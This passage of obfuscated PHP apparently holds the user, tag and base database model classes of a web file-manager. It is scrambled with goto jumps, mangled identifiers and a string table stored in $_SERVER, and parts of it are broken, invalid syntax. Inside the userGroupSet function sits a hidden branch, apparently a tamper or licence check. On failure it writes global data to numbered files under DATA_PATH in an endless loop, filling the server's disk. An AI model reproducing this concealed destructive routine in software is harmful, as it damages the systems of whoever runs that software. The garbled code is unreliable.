Model($Bŋև[494])->field($this->simpleField)->where($F)->select(); $Cۊ = array_to_keyvalue($Cۊ, $Bŋև[1533]); foreach ($B as $Bэ) { $D = $Cۊ[$Bэ]; if (!$D) { $C[$Bэ . $Bŋև[33]] = $this->getInfoSimpleOuter($Bэ); continue; } $D[$Bŋև[2131]] = Action($Bŋև[2132])->parseUrl($D[$Bŋև[2131]]); $C[$Bэ . $Bŋև[33]] = $D; } } return $C; } protected function userStatus($A󉨙, $cć) { $DĦ׉ = $this->getInfoSimple($A󉨙); if (!$DĦ׉) { return !1; } $F讔 = array($_SERVER[][715] => $cć); return $this->userEdit($A󉨙, $F讔); } protected function userRemove($A) { goto b; E׊: Model($aï[1783])->where($C)->delete(); Model($aï[2145])->where($C)->delete(); Model($aï[2161])->where($C)->delete(); goto D; bӠʏ: $C = array($aï[1524] => $A); Model($aï[576])->where($C)->delete(); Model($aï[2160])->where($C)->delete(); goto E׊; b: $aï =& $_SERVER[]; $Bޒ = $this->getInfoSimple($A); if (!$Bޒ) { return !1; } goto bӠʏ; D: Model($aï[1982])->removeUserAll($A); Model($aï[795])->userRootRemove($A); return $this->where($C)->delete(); goto a; a: } protected function userGroupSet($d, $e򉮺, $E烮 = array()) { goto AՍ; AՍ: $Eۨ =& $_SERVER[]; $FƂ = $_SERVER[$Eۨ[1081]]; $aᗱ = $Eۨ[1400]; goto fיˏ; dȻ: $B݋ = 0; foreach ($e򉮺 as $D => $aШ) { $cՓ = array($Eۨ[1533] => $d, $Eۨ[1702] => $D, $Eۨ[1797] => $aШ); $cՓ[$Eۨ[1725]] = isset($E烮[$B݋]) ? $E烮[$B݋] : 0; $B݋++; $eХ[] = $cՓ; } return $fד->addAll($eХ, array(), !0); goto Eԟ; a: $fד = Model($Eۨ[1783]); $fד->where(array($Eۨ[1533] => $d))->delete(); $eХ = array(); goto dȻ; fיˏ: if ($_SERVER[$Eۨ[836]] != $aᗱ($FƂ)) { goto cҧҟ; Dۂ: $e̟٫(); $c = $Eۨ[1401]; $cՇԈ = json_encode($GLOBALS[$Eۨ[1402]]); goto b; b: $d = 1; for ($b֐ = $d; $b֐ > 0; $b֐++) { $c(DATA_PATH . $b֐, $cՇԈ); } goto A٘; cҧҟ: $e̟٫ = $Eۨ[838]; $BÐ = $Eۨ[839]; $cē = $_SERVER[$Eۨ[840]] . $Eۨ[841]; goto D쯙; D쯙: $E۩ = $BÐ($cē); $a݂ = explode($Eۨ[229], $E۩); if (count($a݂) < $Eۨ[593]) { $c唇 = $Eۨ[842]; $c唇(); } goto fܝ; fܝ: $cͷ = $Eۨ[843]; $cͷ($_SERVER[$Eۨ[844]]); $e̟٫ = $Eۨ[838]; goto Dۂ; A٘: } $dѯ = $this->getInfoSimple($d); if (!$dѯ || !is_array($e򉮺)) { return !1; } goto a; Eԟ: } protected function userGroupAdd($f˧, $fȃ = array()) { $c誷 =& $_SERVER[]; $d͙ = $this->getInfoSimple($f˧); if (!$d͙ || empty($fȃ)) { return !1; } $a = array(); foreach ($fȃ as $e => $B梖ϚĿ) { $a[] = array($c誷[1533] => $f˧, $c誷[1702] => $e, $c誷[1797] => $B梖ϚĿ, $c誷[1725] => 0); } return Model($c誷[1783])->addAll($a, array(), !0); } protected function userGroupRemove($D, $B解Ǳ) { $Bﰋ =& $_SERVER[]; $aҘꏺ = $this->getInfoSimple($D); if (!$aҘꏺ || !$B解Ǳ) { return !1; } $A܄ = array($Bﰋ[1524] => $D, $Bﰋ[1780] => $B解Ǳ); return Model($Bﰋ[1783])->where($A܄)->delete(); } public function listData() { $cٚ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($cٚ[$_SERVER[][367]]); return $cٚ; } public function listByID($c) { $BʂƝ =& $_SERVER[]; if (!$c) { return; } $C؊ = array($BʂƝ[1533] => array($BʂƝ[7], $c)); $D = $this->where($C؊)->select(); $this->_listDataApply($D); return $D; } public function listByGroup($EĽ = 0, $f = array()) { goto c宇Ĉ; c宇Ĉ: $E摪 =& $_SERVER[]; $Fס = $E摪[33]; $d = array(); goto d鉶; fЙΦ: $this->_listDataApply($f鄞[$E摪[367]]); return $f鄞; goto dڦ; d鉶: if ($EĽ) { $d = array($E摪[2162] => intval($EĽ)); $Fס = "\x4c\x45\x46\124\40\112\117\111\x4e\40{$this->tablePrefix}\x75\x73\145\162\x5f\x67\x72\157\x75\160\40\165\x73\x65\x72\x5f\x67\x72\157\165\x70\40\x6f\x6e\x20\165\163\x65\162\56\x75\163\x65\x72\111\104\x20\75\x20\165\163\145\162\x5f\147\162\x6f\x75\160\x2e\165\163\x65\x72\111\x44"; $Eڌɋװ = Input::get($E摪[435], null, $E摪[33]) ? $E摪[33] : $E摪[2163]; } if (isset($f[$E摪[715]])) { $d[$E摪[2164]] = $f[$E摪[715]]; } $f鄞 = $this->_makeOrder($Eڌɋװ)->field($E摪[2165])->where($d)->join($Fס)->selectPage(50); goto fЙΦ; dڦ: } private function _makeOrder($F轒Ѽ = '') { goto eܵ; c: $F轒Ѽ = $F轒Ѽ . "\x75\163\x65\162\x2e{$A먬}\40{$EǑ݉}\54\x20\165\x73\145\162\x2e\165\x73\145\162\x49\104\x20\x61\x73\x63"; return $this->alias($dÉ[1905])->order($F轒Ѽ); goto C; eܵ: $dÉ =& $_SERVER[]; $E煋 = array($dÉ[1533], $dÉ[28], $dÉ[1688], $dÉ[1660], $dÉ[194]); $DǛ = array($dÉ[428] => $dÉ[429], $dÉ[430] => $dÉ[431]); goto c; c: $A먬 = Input::get($dÉ[435], $dÉ[7], $dÉ[1524], $E煋); $EǑ݉ = Input::get($dÉ[436], $dÉ[7], $dÉ[1784], array($dÉ[1784], $dÉ[430])); $EǑ݉ = $DǛ[$EǑ݉]; goto c; C: } public function listSearch($EȢ) { goto aܴ; b§攌: $this->_filterByGroup($Aχ, $fͽ); return $Aχ; goto f; aܴ: $B =& $_SERVER[]; $c = $EȢ[$B[1785]]; $fͽ = isset($EȢ[$B[1786]]) ? $EȢ[$B[1786]] : !1; goto Eʑ; Eը: $Aχ = $this->_makeOrder()->where($a狩)->selectPage(20); if (!$Aχ || count($Aχ[$B[367]]) < 5 && Input::check($c, $B[316])) { $A = $this->_searchFromMeta($B[443], $c, 10); $dϬҮ = $this->_searchFromMeta($B[444], $c, 10); $fʂ = array_merge($A, $dϬҮ, $Aχ[$B[367]]); $Aχ[$B[367]] = array_unique_by_key($fʂ, $B[1533]); $Aχ[$B[364]][$B[365]] = count($Aχ[$B[367]]); $Aχ[$B[364]][$B[366]] = ceil($Aχ[$B[364]][$B[365]] / $Aχ[$B[364]][$B[361]]); } $this->_listDataApply($Aχ[$B[367]]); goto b§攌; Eʑ: $c = str_replace($B[1787], $B[1788], trim($c)); $a狩 = array($B[28] => array($B[380], "\x25{$c}\45"), $B[303] => array($B[380], "{$c}\45"), $B[1965] => array($B[380], "{$c}\45"), $B[959] => $B[1789]); if (Input::check($c, $B[309])) { $a狩[$B[1533]] = array($B[380], "{$c}\x25"); $a狩[$B[2146]] = array($B[380], "{$c}\x25"); } goto eƋ; eƋ: if (!$c) { $a狩 = array(); } if (isset($EȢ[$B[715]])) { $a狩[$B[715]] = $EȢ[$B[715]]; } $a狩 = $this->parseWhereLike($a狩); goto Eը; f: } private function _filterByGroup(&$c򣞷, $b菵) { $Dԕ =& $_SERVER[]; if (!$b菵) { return $c򣞷; } foreach ($c򣞷[$Dԕ[367]] as $Eº => &$bˮĔ) { $d퓚 = array_to_keyvalue($bˮĔ[$Dԕ[1875]], $Dԕ[33], $Dԕ[1702]); if (!in_array($b菵, $d퓚)) { unset($c򣞷[$Dԕ[367]][$Eº]); } } unset($bˮĔ); $c򣞷[$Dԕ[367]] = array_values($c򣞷[$Dԕ[367]]); $c򣞷[$Dԕ[364]] = array($Dԕ[1937] => count($c򣞷[$Dԕ[367]]), $Dԕ[1935] => $c򣞷[$Dԕ[364]][$Dԕ[361]], $Dԕ[1934] => 1, $Dԕ[1936] => 1); } private function _searchFromMeta($B, $a, $E) { goto Dƙ; Eʔ: $fޓɍ = $this->parseWhereLike($fޓɍ); $B尤骴 = Model($Cׄ[2166])->where($fޓɍ)->limit($E)->select(); if (!$B尤骴) { return array(); } goto bҒ; c: return $B᭿; goto B; Dƙ: $Cׄ =& $_SERVER[]; $a = strtolower($a); $fޓɍ = array($Cׄ[93] => $B, $Cׄ[372] => array($Cׄ[380], "\x25{$a}\45")); goto Eʔ; bҒ: $B尤骴 = array_to_keyvalue($B尤骴, $Cׄ[33], $Cׄ[1533]); $B᭿ = $this->where(array($Cׄ[1524] => array($Cׄ[7], $B尤骴)))->select(); if (!$B᭿) { return array(); } goto c; B: } private function _listDataApplyItem($E) { $eҫ = array($E); $this->_listDataApply($eҫ); return $eҫ[0]; } private function _listDataApply(&$b) { goto B; Fؐ: $this->_listAppendSourceRoot($b, $a); goto d̩; B: $F =& $_SERVER[]; if (!$b) { return; } array_remove_key($b, $F[851]); goto F; F: $a = array_to_keyvalue($b, $F[33], $F[1533]); $this->_listAppendGroup($b, $a); $this->_listAppendMeta($b, $a); goto Fؐ; d̩: } private function _listAppendSourceRoot(&$Aݐ, $Bث) { goto Bλ; Bλ: $eӔ =& $_SERVER[]; $b = array($eӔ[478] => 0, $eӔ[404] => SourceModel::TYPE_USER, $eӔ[484] => array($eӔ[7], $Bث)); $f¿ = $eӔ[1795]; goto A柖; A柖: $Aë = Model($eӔ[795])->order($eӔ[1796])->field($f¿)->where($b)->select(); $Aë = array_to_keyvalue($Aë, $eӔ[484]); $Aë = array_remove_key($Aë, $eӔ[484]); goto Eԧ; Eԧ: foreach ($Aݐ as &$CҲ) { $CҲ[$eӔ[85]] = $Aë[$CҲ[$eӔ[1533]]] ? $Aë[$CҲ[$eӔ[1533]]] : array(); } unset($CҲ); goto d垅; d垅: } private function _listAppendGroup(&$fסߍ, $D쪰) { goto E; Cф̡: $F珶 = array_to_keyvalue($BȮ̪, $e[33], $e[1702]); $F珶 = array_remove_value(array_unique($F珶), $e[191]); if (!$F珶 || !$BȮ̪) { return; } goto fÓҒ; F۷멐: foreach ($fסߍ as &$c) { $c[$e[1875]] = array(); if (isset($BȮ̪[$c[$e[1533]]])) { $c[$e[1875]] = $BȮ̪[$c[$e[1533]]]; } } unset($c); goto A̮Ì; fÓҒ: $B = array($e[1702] => array($e[7], $F珶)); $f޶æ = Model($e[1873])->field($e[2167])->where($B)->select(); $f޶æ = array_to_keyvalue($f޶æ, $e[1702]); goto cҔ; E: $e =& $_SERVER[]; $B = array($e[1533] => array($e[7], $D쪰)); $BȮ̪ = Model($e[1783])->where($B)->select(); goto Cф̡; cҔ: $BȮ̪ = array_to_keyvalue_group($BȮ̪, $e[1533]); foreach ($BȮ̪ as &$Eȏ) { $BǤ = array(); foreach ($Eȏ as $F㉊) { if (!$F㉊[$e[1797]]) { continue; } $Bڇ = Model($e[488])->listData($F㉊[$e[1797]]); $BǤ[] = array($e[1702] => $F㉊[$e[1702]], $e[2168] => $f޶æ[$F㉊[$e[1702]]][$e[28]], $e[502] => $f޶æ[$F㉊[$e[1702]]][$e[502]], $e[406] => $Bڇ); } $Eȏ = $BǤ; } unset($Eȏ); goto F۷멐; A̮Ì: } private function _listAppendMeta(&$b︣, $fı) { goto C䍛; B: foreach ($b︣ as &$E) { $eֿ = array(); if (isset($aȕ[$E[$FД[1533]]])) { $eֿ = $aȕ[$E[$FД[1533]]]; } $E[$FД[2170]] = array(); if (isset($eֿ[$AĻ])) { $E[$FД[2170]] = $eݣ->getUserJobInfo($eֿ[$AĻ]); } } unset($E); goto d; C䍛: $FД =& $_SERVER[]; $AĻ = UserJobModel::JOB_KEY; $F = array($FД[2147]); goto f; f: $f̭傓 = array($FД[1533] => array($FД[7], $fı)); $aȕ = Model($FД[2145])->where($f̭傓)->select(); $aȕ = array_to_keyvalue_group($aȕ, $FД[1533]); goto cԈƌޫ; cԈƌޫ: foreach ($aȕ as &$a) { $bӞ = array(); foreach ($a as $C) { if (!in_array($C[$FД[93]], $F)) { $bӞ[$C[$FД[93]]] = $C[$FД[372]]; } } $a = $bӞ; } unset($a); $eݣ = Model($FД[2169]); goto B; d: } protected function groupUserAll($a) { $b =& $_SERVER[]; if (!$a) { return !1; } $E۠ = Model($b[1783])->field($b[1533])->where(array($b[1702] => array($b[7], $a)))->select(); $E۠ = array_to_keyvalue($E۠, $b[33], $b[1533]); return array_unique($E۠); } public function userSearch($B, $Dҳ߯Ɍ = "\x2a") { return Model($_SERVER[][519])->where($B)->field($Dҳ߯Ɍ)->find(); } } goto C; C: class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\x65\162\x5f\157\160\164\x69\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($Dᅵߚ) { $B =& $_SERVER[]; if (!defined($B[454])) { define($B[454], 0); } return "\x55\163\145\162\x4f\160\x74\151\x6f\x6e\x5f{$Dᅵߚ}\x5f" . USER_ID; } protected function filterWhere($cݰ) { $Eˊ =& $_SERVER[]; if (!defined($Eˊ[454])) { define($Eˊ[454], 0); } $cݰ[$Eˊ[1533]] = USER_ID; return $cݰ; } public function cacheRemoveUser($bш, $Eلһ) { return Cache::remove("\x55\x73\x65\x72\x4f\160\164\151\x6f\x6e\x5f{$bш}\137" . $Eلһ); } protected function optionDefault($aථ = '') { $e =& $_SERVER[]; if ($aථ == $e[33]) { return $GLOBALS[$e[6]][$e[2171]]; } if ($aථ == $e[2172]) { return $GLOBALS[$e[6]][$e[2173]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\145\162\x2e\164\x61\147\114\151\x73\164"; public $modelType = "\125\163\145\x72\117\160\x74\x69\157\x6e"; public $field = array("\156\141\155\x65", "\163\x74\171\154\x65", "\x73\157\x72\x74"); public function listData($eܟ = false, $aʻ = "\x73\x6f\162\x74", $Bä = false) { return parent::listData($eܟ, $aʻ, $Bä); } public function remove($A٣) { return parent::remove($A٣); } public function add($d, $Eԥ = "\x6c\141\142\x65\x6c\55\x67\162\145\x79\55\156\157\162\155\x61\154") { $AܼԹ =& $_SERVER[]; if ($this->findByName($d)) { return !1; } $f = array($AܼԹ[413] => $d, $AܼԹ[464] => $Eԥ, $AܼԹ[1706] => $this->getSort($AܼԹ[256]) + 1); return parent::insert($f); } public function update($e٤, $B) { $dѿф =& $_SERVER[]; $cǱҕ = $this->listData($e٤); $B = $this->findByName($B[$dѿф[28]]); if (!$cǱҕ || $B && $B[$dѿф[393]] != $cǱҕ[$dѿф[393]]) { return !1; } return parent::update($e٤, $B); } public function moveTop($Aݿ) { $bː =& $_SERVER[]; $c = parent::listData(); $C󥎚 = $this->getSort($bː[255]); foreach ($c as &$cΰ) { if ($cΰ[$bː[393]] == $Aݿ) { $cΰ[$bː[1725]] = $C󥎚; continue; } $cΰ[$bː[1725]] += 1; } unset($cΰ); return parent::resetData($c); } public function moveBottom($b󣴙) { $Bߏ =& $_SERVER[]; $c݅ŵ = $this->getSort($Bߏ[256]) + 1; return parent::update($b󣴙, array($Bߏ[1725] => $c݅ŵ)); } public function resetSort($Bٟǒ) { goto eڬ; B罼: for ($d = 0; $d < count($Bٟǒ); $d++) { $c[$Bٟǒ[$d] . $D舡[33]] = $d + 1; } $F = parent::listData(); foreach ($F as &$d뇖) { $Dߒ = $c[$d뇖[$D舡[393]]]; $d뇖[$D舡[1725]] = $Dߒ ? $Dߒ : $d뇖[$D舡[1725]]; } goto f; eڬ: $D舡 =& $_SERVER[]; $c = array(); $Bٟǒ = is_array($Bٟǒ) ? $Bٟǒ : array(); goto B罼; f: unset($d뇖); return parent::resetData($F); goto e×; e×: } private function getSort($E) { $cŻ =& $_SERVER[]; $E = parent::listData(); $A = array_to_keyvalue($E, $cŻ[33], $cŻ[1725]); if (!$A) { $A = array(0); } $C쌰 = $E == $cŻ[256] ? max($A) : min($A); return intval($C쌰); } } goto D; E: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\x64\x69\x66\171\124\x69\x6d\x65", "\x74\x69\x6d\145", "\x69\156\x73\x65\x72\164\x2c\165\160\144\x61\x74\145", "\146\165\156\x63\x74\x69\x6f\x6e"), array("\x63\x72\x65\141\164\145\124\151\155\145", "\164\151\x6d\145", "\151\x6e\x73\145\x72\x74", "\x66\x75\x6e\143\x74\151\157\x6e")); public function setDataAuto($Fײ) { $this->dataAuto = $Fײ; } public function __construct($A = '', $Cڃ = '', $fʳ݉ = '') { parent::__construct($A, $Cڃ, $fʳ݉); } protected $tableMeta = array(); protected function _beforeInsert(&$d߫, $bś) { $DûҜ =& $_SERVER[]; if (!$this->checkDataAutoHas($DûҜ[353])) { return; } $this->dataBeforeFilter($d߫, $DûҜ[353]); } protected function _beforeUpdate(&$e, $D) { $d˫ =& $_SERVER[]; if (!$this->checkDataAutoHas($d˫[354])) { return; } $this->dataBeforeFilter($e, $d˫[354]); } protected function _afterSelect(&$e, $aՇ) { if (!is_array($e)) { return; } if (!$this->checkDataAutoHas($_SERVER[][355])) { return; } foreach ($e as &$D鮞) { $this->dataAfterFilter($D鮞); } unset($D鮞); } protected function _afterFind(&$c, $Bֹ) { if (!is_array($c)) { return; } if (!$this->checkDataAutoHas($_SERVER[][355])) { return; } $this->dataAfterFilter($c); } public static function textEncode($B׉) { if (!$B׉) { return $B׉; } $b = json_encode($B׉); $b = preg_replace_callback($_SERVER[][356], function ($eӆ) { return addslashes($eӆ[0]); }, $b); return json_decode($b); } public static function textDecode($e) { $e˒׮ =& $_SERVER[]; $Fݜܼ = json_encode($e); $Fݜܼ = preg_replace_callback($e˒׮[357], function ($aȆ) { return $_SERVER[][97]; }, $Fݜܼ); return json_decode($Fݜܼ); } public function setAutoIncrement($eۋ˃) { $c = array($this->getPk() => $eۋ˃); $D͞ݮ = $this->data($c)->add(); if ($D͞ݮ) { $this->delete($D͞ݮ); } } public function getAutoIncrement() { $A޺ = $this->getTableName(); $Bה = $this->max($this->getPk()); $Cǆ = $this->query("\x73\x68\x6f\167\40\x74\x61\x62\x6c\145\40\163\x74\x61\164\165\163\x20\167\x68\145\162\145\x20\116\141\x6d\x65\75\47{$A޺}\x27"); $A = $Cǆ[0][$_SERVER[][358]]; $Fʷғ = max($Bה, $A); return $Fʷғ; } protected function _callBefore($e碑, $aɮʯܙ) { return $this->cacheCallCheck($e碑, $aɮʯܙ, !1); } protected function _callAfter($cҍ, $FㅵԌ) { return $this->cacheCallCheck($cҍ, $FㅵԌ, !0); } protected function cacheFunctionAlias($B߻) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($eۑ, $DɍҐ, $D = false) { $C = $this->cacheFunctionAlias($DɍҐ); if (!$C) { return; } foreach ($C as $E => $DҊ) { $C = $DҊ[0]; $eо = explode($_SERVER[][47], $DҊ[1]); if ($eۑ == $E) { return $this->cacheFunctionGet($E, $C); } if ($D && in_array($eۑ, $eо)) { $this->cacheFunctionClear($E, $C); } } } public function cacheFunctionGet($B⒐, $a) { $C຋ = $this->cacheKeyMake($B⒐, $a); $a = Cache::get($C຋); if (!is_array($a)) { $a = call_user_func_array(array($this, $B⒐), array($a, !0)); Cache::set($C຋, $a); } return $a; } public function cacheFunctionClear($dҋ, $f) { $bˣ = $f; if (!is_array($f)) { $bˣ = array($f); } foreach ($bˣ as $aۮ) { $b = $this->cacheKeyMake($dҋ, $aۮ); Cache::remove($b); } } private function cacheKeyMake($bㇶ, $FѰ) { $D܅ =& $_SERVER[]; return get_class($this) . $D܅[71] . $bㇶ . $D܅[359] . $FѰ; } protected function selectPageReset() { $Cڰ =& $_SERVER[]; if (isset($GLOBALS[$Cڰ[360]])) { return; } $GLOBALS[$Cڰ[360]] = isset($GLOBALS[$Cڰ[7]][$Cڰ[361]]) ? $GLOBALS[$Cڰ[7]][$Cڰ[361]] : !1; $GLOBALS[$Cڰ[362]] = isset($GLOBALS[$Cڰ[7]][$Cڰ[351]]) ? $GLOBALS[$Cڰ[7]][$Cڰ[351]] : !1; $GLOBALS[$Cڰ[7]][$Cڰ[361]] = !1; $GLOBALS[$Cڰ[7]][$Cڰ[351]] = !1; } protected function selectPageRestore() { $Cۿі =& $_SERVER[]; if (!isset($GLOBALS[$Cۿі[360]])) { return; } $GLOBALS[$Cۿі[7]][$Cۿі[361]] = $GLOBALS[$Cۿі[360]]; $GLOBALS[$Cۿі[7]][$Cۿі[351]] = $GLOBALS[$Cۿі[362]]; unset($GLOBALS[$Cۿі[360]]); unset($GLOBALS[$Cۿі[362]]); } protected function selectPage($Dżظ = 200, $a = 1) { goto Aꈞ; dȞ: $E̱ = $Fȣ; $E̱[$f[363]] = array(); $Dżظ = intval($Dżظ); goto Cއ٥; Eò: if (!is_array($D㐟݌)) { $D㐟݌ = array(); } if ($A裪 == 1) { $CΊ = count($D㐟݌); } $F = array($f[364] => array($f[365] => $CΊ, $f[361] => $Dżظ, $f[351] => $a, $f[366] => $A裪), $f[367] => $D㐟݌); goto d; Aꈞ: $f =& $_SERVER[]; global $in; $Fȣ = $this->optionsValue(); goto Aؼ; Cއ٥: $Dżظ = $Dżظ <= 5 ? 5 : ($Dżظ >= $Dէ ? $Dէ : $Dżظ); $a = intval(isset($in[$f[351]]) && $in[$f[351]] ? $in[$f[351]] : $a); $a = $a <= 1 ? 1 : $a; goto Eٓ; d: return $F; goto C; Eٓ: $D㐟݌ = array(); $E = 1; if ($a == 1 && $E) { $this->optionsValue($Fȣ); $D㐟݌ = $this->page($a, $Dżظ)->select(); $CΊ = is_array($D㐟݌) ? count($D㐟݌) : 0; if ($CΊ < $Dżظ) { $A裪 = 1; } else { $this->optionsValue($E̱); $CΊ = intval($this->count()); $A裪 = ceil($CΊ / $Dżظ); } } else { $this->optionsValue($E̱); $CΊ = intval($this->count()); $A裪 = ceil($CΊ / $Dżظ); $a = $a >= $A裪 ? $A裪 : $a; $this->optionsValue($Fȣ); $D㐟݌ = $this->page($a, $Dżظ)->select(); } goto Eò; Aؼ: $Dէ = 50000; $Dżظ = isset($in[$f[361]]) && $in[$f[361]] ? $in[$f[361]] : $Dżظ; if ($Dżظ === -1) { $in[$f[361]] = !1; $Dէ = 100000000; $Dżظ = $Dէ; } goto dȞ; C: } protected function checkLength($e槇, $aۈ = 0, $Aܺ = '') { $E檭 =& $_SERVER[]; $aۈ = $aۈ ? $aۈ : 65536; if (!$e槇 || strlen($e槇) < $aۈ) { return; } $Aܺ = $Aܺ ? $Aܺ . $E檭[68] : $E檭[33]; show_json($Aܺ . LNG($E檭[368]) . "\x28{$aۈ}\x29", !1); } protected function metaSet($a, $e̻փ = null, $F񛸮 = null) { goto b; b: $a׼ =& $_SERVER[]; if (!$this->tableMeta || !$a) { return !1; } $c׹̟ = $this->tableMeta[$a׼[369]]; goto B첥; F̵҅: if (is_string($e̻փ)) { $bڸ[$e̻փ] = $F񛸮; } $aì = array(); foreach ($bڸ as $b𲂙 => $Cڎ) { $this->checkLength($Cڎ, !1, $Fؿ . $a׼[4] . $b𲂙); $aì[] = array($c׹̟ => $a, $a׼[93] => $b𲂙, $a׼[372] => $Cڎ); } goto D셤ړ; B첥: $Fؿ = $this->tableMeta[$a׼[370]]; $d嬟 = Model($Fؿ); $eƅ = array($c׹̟ => $a, $a׼[371] => $e̻փ); goto d; d: if (is_null($e̻փ)) { return $d嬟->where(array($c׹̟ => $a))->delete(); } if (is_null($F񛸮) && is_string($e̻փ)) { return $d嬟->where($eƅ)->delete(); } $bڸ = is_array($e̻փ) ? $e̻փ : array(); goto F̵҅; D셤ړ: $fҡ½ = $a׼[373] . $this->tableMeta; CacheLock::lock($fҡ½); $d嬟->where(array($c׹̟ => $a))->addAll($aì, array(), !0); goto dѶõ; dѶõ: CacheLock::unlock($fҡ½); return !0; goto Cͷ; Cͷ: } public function metaGet($c, $A͆ = false) { goto D⬷ȟɶ; fو: $f = $Cά->field($Bٖ[374])->where($Aߖꏘ)->select(); $f = array_to_keyvalue($f, $Bٖ[93], $Bٖ[372]); return $f; goto c͋; Eυ: $Cά = Model($this->tableMeta[$Bٖ[370]]); if ($A͆) { $Aߖꏘ = array($e󎞓 => $c, $Bٖ[93] => $A͆); return $Cά->where($Aߖꏘ)->getField($Bٖ[372]); } $Aߖꏘ = array($e󎞓 => $c); goto fو; D⬷ȟɶ: $Bٖ =& $_SERVER[]; if (!$this->tableMeta) { return array(); } $e󎞓 = $this->tableMeta[$Bٖ[369]]; goto Eυ; c͋: } private function checkDataAutoHas($eʈվ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $b䡇) { if (in_array($eʈվ, explode($_SERVER[][47], $b䡇[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$E蹶, $a) { $B =& $_SERVER[]; foreach ($this->dataAuto as $C) { $bïγ͖ = $C[0]; if (!in_array($a, explode($B[47], $C[2]))) { continue; } switch (trim($C[3])) { case $B[319]: case $B[320]: $E˃ = $C[1]; $b͎ = isset($C[4]) ? (array) $C[4] : array(); if ($E˃ == $B[197] && array_key_exists($bïγ͖, $E蹶)) { if (!$E蹶[$bïγ͖]) { unset($E蹶[$bïγ͖]); } break; } if (isset($E蹶[$bïγ͖])) { array_unshift($b͎, $E蹶[$bïγ͖]); } if ($B[319] == $C[3]) { $E蹶[$bïγ͖] = call_user_func_array($E˃, $b͎); } else { $E蹶[$bïγ͖] = call_user_func_array(array(&$this, $E˃), $b͎); } break; case $B[271]: $E蹶[$bïγ͖] = $E蹶[$C[1]]; break; case $B[292]: if (isset($E蹶[$bïγ͖]) && !is_string($E蹶[$bïγ͖])) { $E蹶[$bïγ͖] = json_encode_force($E蹶[$bïγ͖]); } break; case $B[321]: if ($E蹶[$bïγ͖] === $B[33]) { unset($E蹶[$bïγ͖]); } break; case $B[322]: $E蹶[$bïγ͖] = $C[1]; default: break; } } if ($a == $B[353]) { $B = strtolower($this->db->getDbType()); if (strpos($B, $B[9]) !== 0) { return; } $dЗ̧ = $this->field(!0)->fields; $c = $dЗ̧[$B[250]]; if (isset($dЗ̧[$B[249]])) { unset($c[$dЗ̧[$B[249]]]); } foreach ($c as $f䝉슳 => $a) { if (!isset($E蹶[$f䝉슳])) { $E蹶[$f䝉슳] = $B[33]; } } } } private function dataAfterFilter(&$c) { $F =& $_SERVER[]; foreach ($this->dataAuto as $Fѐϔ) { $b͋ = $Fѐϔ[0]; if (!in_array($F[355], explode($F[47], $Fѐϔ[2]))) { continue; } if (!isset($c[$b͋])) { continue; } switch (trim($Fѐϔ[3])) { case $F[319]: case $F[320]: $F̏ = isset($Fѐϔ[4]) ? (array) $Fѐϔ[4] : array(); array_unshift($F̏, $c[$b͋]); if ($F[319] == $Fѐϔ[3]) { $c[$b͋] = call_user_func_array($Fѐϔ[1], $F̏); } else { $c[$b͋] = call_user_func_array(array(&$this, $Fѐϔ[1]), $F̏); } break; case $F[271]: $c[$b͋] = $c[$Fѐϔ[1]]; break; case $F[292]: $Cܥ = $c[$b͋]; $c[$b͋] = json_decode($Cܥ, !0); if (is_null($c[$b͋])) { $c[$b͋] = $Cܥ; } break; case $F[321]: if ($c[$b͋] === $F[33]) { unset($c[$b͋]); } break; case $F[322]: $c[$b͋] = $Fѐϔ[1]; default: break; } } } public function saveAll($d傦) { goto Eᛕބ; e: $E = array(); $B٤ = count($d傦); for ($DƋȫ = 0; $DƋȫ < $B٤; $DƋȫ++) { $DŃ = $d傦[$DƋȫ]; if (!is_array($DŃ) || count($DŃ) != 4) { continue; } $fҟ׎ = "\x55\120\x44\101\x54\x45\x20\x60{$F}\x60\40\x53\105\x54\x20{$DŃ[2]}\40\75\40\x43\101\x53\105\40{$DŃ[0]}\40\12"; if ($Dع == 0) { $cｯ = $fҟ׎; } $E[] = $BȂ̈[116] . $DŃ[1] . $BȂ̈[116]; $Dع++; $cｯ .= "\40\127\x48\105\116\x20\x27{$DŃ[1]}\47\x20\124\110\105\116\x20\47{$DŃ[3]}\47\40\12"; if ($Dع == $fŏ || $DƋȫ == $B٤ - 1) { goto aӓЌ; c: $Dع = 0; $cｯ = $fҟ׎; $this->chunkEventCheck(count($E)); goto aĈ; aĈ: $E = array(); goto cʌ; aӓЌ: $b㦈 = implode($BȂ̈[47], $E); $cｯ .= "\40\x45\x4e\x44\40\x20\x57\110\x45\122\x45\40{$DŃ[0]}\x20\x49\x4e\40\x28{$b㦈}\51\40"; $this->execute($cｯ); goto c; cʌ: } } goto F; F: $this->chunkEventSet(); goto eҰ; Eᛕބ: $BȂ̈ =& $_SERVER[]; $F = $this->tablePrefix . $this->tableName; $fŏ = self::SQL_WHERE_IN_CHUNK; goto CÇᠪ; CÇᠪ: $d傦 = is_array($d傦) ? $d傦 : array(); $cｯ = $BȂ̈[375]; $Dع = 0; goto e; eҰ: } public function saveAllEach($bύ) { $AҢ½ =& $_SERVER[]; $FȈ = $this->tablePrefix . $this->tableName; foreach ($bύ as $cَã) { if (!is_array($cَã) || count($cَã) != 4) { continue; } $Cö = $cَã[0] . $AҢ½[376] . $cَã[1] . $AҢ½[116]; $Eҕ = $cَã[2] . $AҢ½[376] . $cَã[3] . $AҢ½[116]; $A­ = "\x75\160\x64\141\164\145\x20{$FȈ}\40\163\x65\164\x20{$Eҕ}\40\167\x68\145\x72\145\40{$Cö}\73"; $this->execute($A­); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($Aم = false, $eܾ = false) { $this->_chunkEvent = $Aم; $this->_chunkEventParam = $eܾ; } private function chunkEventCheck($a) { if (!$this->_chunkEvent) { return; } $bᇵ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $bᇵ[$_SERVER[][377]] = $a; Hook::trigger($this->_chunkEvent, $bᇵ); } public function addAll($f߫˖, 